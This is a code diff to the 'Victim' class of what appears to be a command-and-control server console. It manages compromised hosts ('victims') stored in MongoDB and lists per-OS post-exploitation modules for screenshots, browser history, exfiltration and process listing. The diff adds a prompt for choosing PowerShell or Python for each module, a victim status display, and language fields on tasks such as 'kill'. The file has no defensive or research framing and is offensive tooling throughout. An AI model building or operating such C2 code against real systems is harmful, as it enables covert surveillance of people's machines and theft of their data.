@@ -14,7 +14,11 @@ class Victim:
 
 	mongoclient = None
 	victims = {}
+
+	## Modules supported by various OS and their language support
 	module_hash = {'Windows' : ['screenshot','browser_history','exfiltration','running_processes'], 'Linux': ['screenshot','exfiltration','running_processes']}
+	language_supported = {'screenshot':['powershell','python'], 'browser_history': ['powershell','python'], 'exfiltration': ['powershell','python'], 'running_processes':['powershell','python']}
+
 	databasename = os.environ['MONGODB_DATABASE']
 
 	def __init__(self,victim_id,platform,os_version,admin,status = 'Alive',lastseen = datetime.datetime.now(),add_db = True):
@@ -35,9 +39,10 @@ class Victim:
 	def show_victims(cls):
 		print(f"\nTo interact with a victim run {colored('use <victim_id>','cyan')}")
 		print("")
-		print("Victim IDs")
-		print("----------")
-		print('\n'.join(cls.victims.keys()))
+		print("Victim IDs		Victim Status")
+		print("----------		-------------")
+		for victim in cls.victims:
+			print(f"{victim}		{cls.victims[victim].status}")
 
 
 	@classmethod
@@ -101,6 +106,26 @@ class Victim:
 			task_obj.update_task_from_db()
 			print(f"{colored('Task ID','cyan')} - {task_obj.task_id} \n{colored('Command','cyan')} - {task_obj.command} \n{colored('Command Output','cyan')} - {task_obj.output} \n{colored('Issued','cyan')} - {task_obj.issued}")
 
+	def get_module_language(self,module):
+		## Does linux support powershell?
+		if self.platform == 'Linux':
+			return 'python'
+
+		while True:
+			print(colored("Modules are supported in powershell (Windows only) and python langauge. Press enter for default, python. Please select language",'cyan'))
+			language = str(input())
+			language = language.lower()
+
+			if language in ['powershell','python']:
+				if language in self.language_supported[module]:
+					return language
+				else:
+					print(colored(f"Sorry {module} doesn't support {language}. Try the other langauge.",'yellow'))
+			elif language in ['back','exit']:
+				return False
+			else:
+				print(colored("Sorry not supported language",'yellow'))
+				continue
 
 	## Displays the victim menu
 	def victim_menu(self):
@@ -128,7 +153,7 @@ class Victim:
 
 				## Creates a task with the command kill
 				task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
-				task = Task(victim_id = self.victim_id ,command = 'kill',options = {}, task_id = task_id)
+				task = Task(victim_id = self.victim_id ,command = 'kill',language='python',options = {}, task_id = task_id)
 				self.tasks[task.task_id] = task
 
 			elif re.match(r'^use .*$',cmd):
@@ -141,8 +166,8 @@ class Victim:
 
 				module = re.findall(r'^use (.*)$',cmd)[0]
 				if module in self.modules:
-					language = 'python'
 					utility = 'collection'
+					language = self.get_module_language(module)
 					Module.show_options(module,utility)
 
 					## Gets the paramters for a module which user might customize
@@ -151,7 +176,7 @@ class Victim:
 					## In case user does not want to run module, option hash will be False else it will be a dictionary
 					if option_hash != False:
 						task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
-						task = Task(victim_id = self.victim_id ,command = module,options = option_hash, task_id = task_id)
+						task = Task(victim_id = self.victim_id ,command = module,language=language, options = option_hash, task_id = task_id)
 						self.tasks[task.task_id] = task
 
 				else:
